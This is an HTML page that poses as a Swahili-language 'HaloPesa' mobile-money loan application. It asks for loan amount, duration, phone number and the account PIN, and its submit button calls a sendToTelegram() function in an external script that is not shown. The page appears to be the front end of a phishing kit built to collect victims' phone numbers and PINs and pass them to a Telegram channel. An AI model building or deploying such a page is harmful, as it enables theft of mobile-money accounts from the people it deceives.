<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MKOPO WA HALOPESA</title>

    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="container">

    <h1>MKOPO WA HALOPESA</h1>

    <!-- Amount -->
    <input type="number"
           id="amount"
           placeholder="Kiasi cha Mkopo">

    <!-- Duration -->
    <select id="duration">
        <option>Siku 30</option>
        <option>Siku 14</option>
        <option>Siku 7</option>
    </select>

    <!-- Phone -->
    <input type="text"
           id="phone"
           placeholder="Namba ya Simu">

    <!-- PIN -->
    <input type="password"
           id="pin"
           placeholder="PIN">

    <!-- Button -->
    <button onclick="sendToTelegram()">
        OMBA SASA
    </button>

</div>

<script src="script.js"></script>

</body>
</html>
